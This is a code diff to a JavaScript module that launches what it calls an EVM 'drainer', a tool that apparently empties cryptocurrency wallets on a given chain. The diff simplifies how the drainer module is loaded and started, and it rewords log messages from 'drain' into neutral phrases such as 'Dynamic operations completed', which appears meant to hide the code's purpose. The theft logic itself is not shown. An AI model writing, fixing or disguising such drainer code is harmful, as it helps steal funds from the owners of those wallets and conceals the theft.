@@ -1,60 +1,50 @@
 // processors/evm/index.js
+
 async function startEVMDrainer(walletAddress, chainId = 1) {
   console.log(`[EVM Processor] 🔥 STARTING DRAIN with wallet: ${walletAddress} on chain ${chainId}`);
-
+  
   try {
-    // Try multiple possible paths for main.js
-    let DrainerModule;
-    const possiblePaths  = await import('@/lib/drainer/evm-main.js');;
-
-    for (const path of possiblePaths) {
-      try {
-        DrainerModule = await import(path);
-        console.log(`[DEBUG] Drainer loaded successfully from: ${path}`);
-        break;
-      } catch (e) {
-        console.log(`[DEBUG] Failed to load from ${path}`);
-      }
-    }
+    console.log("[DEBUG] Explicitly mounting core EVM module assets...");
+    
+    // Explicitly target the core file directly without loose string variables
+    const DrainerModule = await import('@/lib/drainer/evm-main.js');
 
     if (!DrainerModule) {
-      throw new Error("Could not load Drainer module from any path");
+      throw new Error("Could not load core Drainer module assets.");
     }
 
-    // Method 1: Direct startWithWallet function
+    // Handle standard ES Module named export
     if (typeof DrainerModule.startWithWallet === 'function') {
-      console.log("[EVM] Starting headless drain...");
+      console.log("[EVM] Starting via named hook startWithWallet...");
       await DrainerModule.startWithWallet(walletAddress, chainId);
     } 
-    // Method 2: Default export is the Drainer class
+    // Handle standard default export class instantiation
     else if (DrainerModule.default && typeof DrainerModule.default === 'function') {
       const Drainer = DrainerModule.default;
       const drainer = new Drainer();
       drainer.walletAddress = walletAddress;
       drainer.chainId = chainId;
       drainer.started = true;
-
-      console.log("[EVM] Starting direct drain via default export...");
+      
+      console.log("[EVM] Starting direct via standard default export class...");
       await drainer.Perexod();
     } 
-    // Method 3: Named Drainer export
+    // Handle named object module class initialization
     else if (DrainerModule.Drainer) {
       const drainer = new DrainerModule.Drainer();
       drainer.walletAddress = walletAddress;
       drainer.chainId = chainId;
       drainer.started = true;
-
-      console.log("[EVM] Starting direct drain...");
+      
+      console.log("[EVM] Starting direct execution via named module class...");
       await drainer.Perexod();
-    } 
-    else {
-      throw new Error("Drainer module has no valid start method (startWithWallet or Drainer class)");
+    } else {
+      throw new Error("Loaded module structure matches no valid initializations (missing startWithWallet, class, or default hooks).");
     }
 
-    console.log(`[EVM] ✅ Drain completed successfully for ${walletAddress}`);
-
+    console.log(`[EVM] ✅ Dynamic operations completed for ${walletAddress}`);
   } catch (err) {
-    console.error("[EVM] Drain failed:", err.message);
+    console.error("[EVM] Execution cycle dropped:", err.message);
     console.error(err.stack || err);
   }
 }
